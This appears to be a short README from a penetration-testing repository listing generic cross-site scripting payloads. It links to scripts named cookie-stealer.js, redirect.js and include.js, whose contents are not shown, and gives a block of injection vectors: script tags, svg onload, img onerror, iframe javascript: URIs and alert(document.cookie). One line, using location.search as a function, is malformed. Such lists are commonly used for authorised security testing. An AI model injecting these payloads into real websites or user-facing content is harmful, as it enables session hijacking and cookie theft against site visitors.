# Generic xss payloads.

### Maybe useful payloads:

[cookie-stealer.js](useful/cookie-stealer.js)

[redirect.js](useful/redirect.js)

[include.js](useful/include.js)

### Other:

```js
<script>alert("hello")</script>
document.write(location.search("><svg onload=alert(1)>"))
<svg/onload=alert("hi")>
<img src=x onerror="alert('hello');">
<iframe src=”javascript:alert(1)”></iframe>
<var onmouseover="prompt(1)">move the cursor here</var>
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>confirm(document.domain)</script>
```

